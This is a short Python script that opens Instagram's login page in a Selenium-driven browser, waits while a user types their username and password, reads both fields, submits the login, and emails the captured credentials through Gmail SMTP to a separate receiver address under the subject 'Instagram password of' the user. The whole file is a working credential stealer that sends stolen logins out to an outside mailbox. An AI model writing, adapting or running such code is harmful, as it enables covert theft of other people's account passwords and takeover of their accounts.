from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
import smtplib as sm
import time

smtp_server = "smtp.gmail.com"
email = "[SMTP_GMAIL]"
password = "[GMAIL_APP_PASSWORD]"


def send_mail(x, y):
    to = "[RECIEVER_EMAIL]"
    sub = f"Instagram password of {x}"

    with sm.SMTP(smtp_server) as connection:
        connection.starttls()
        connection.login(email, password)
        connection.sendmail(email, to, f"Subject:{sub}\n\n{x}: {y}")

driver = webdriver.Chrome()

driver.get("https://www.instagram.com/")
time.sleep(3)

username = driver.find_element(By.NAME, "username")
passw = driver.find_element(By.NAME, "password")

username.clear()
passw.clear()

time.sleep(30)
a1 = username.get_attribute("value")
a2 = passw.get_attribute("value")

passw.send_keys(Keys.RETURN)

print(a1, a2)
send_mail(a1, a2)

time.sleep(1000)
